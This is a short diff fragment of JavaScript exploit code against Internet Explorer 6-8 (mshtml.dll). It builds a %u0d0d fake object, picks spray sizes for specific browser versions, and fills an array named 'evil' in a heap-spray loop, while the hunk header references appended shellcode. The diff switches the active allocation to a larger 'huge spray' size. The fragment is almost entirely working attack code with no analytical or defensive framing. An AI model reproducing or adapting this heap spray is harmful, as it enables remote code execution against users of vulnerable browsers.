@@ -25,12 +25,12 @@ return mystr.substr(0, (bytes-6)/2) + shellcode;
 alert('ph33r: click me');
 var evil = new Array();
 var FAKEOBJ = unescape("%u0d0d%u0d0d");
-FAKEOBJ = alloc(233120, FAKEOBJ); // IE6 mshtml.dll Version 6.0.2900.5512
+//FAKEOBJ = alloc(233120, FAKEOBJ); // IE6 mshtml.dll Version 6.0.2900.5512
 //FAKEOBJ = alloc(241748, FAKEOBJ); // IE6 mshtml.dll Version 6.00.2900.6036 
 //FAKEOBJ = alloc(733120, FAKEOBJ); // IE7 mshtml.dll Version 7.00.6000.17080
 //FAKEOBJ = alloc(433120, FAKEOBJ); // IE8 mshtml.dll Version 8.00.6001.18939
 //FAKEOBJ = alloc(1294464, FAKEOBJ); // IE8 mshtml.dll Version 8.00.6001.18975
-//FAKEOBJ = alloc(1550371, FAKEOBJ); // oy oy oy huge spray! 
+FAKEOBJ = alloc(1550371, FAKEOBJ); // oy oy oy huge spray! 
 
 for (var k = 0; k < 1000; k++) {
     evil[k] = FAKEOBJ.substr(0, FAKEOBJ.length);
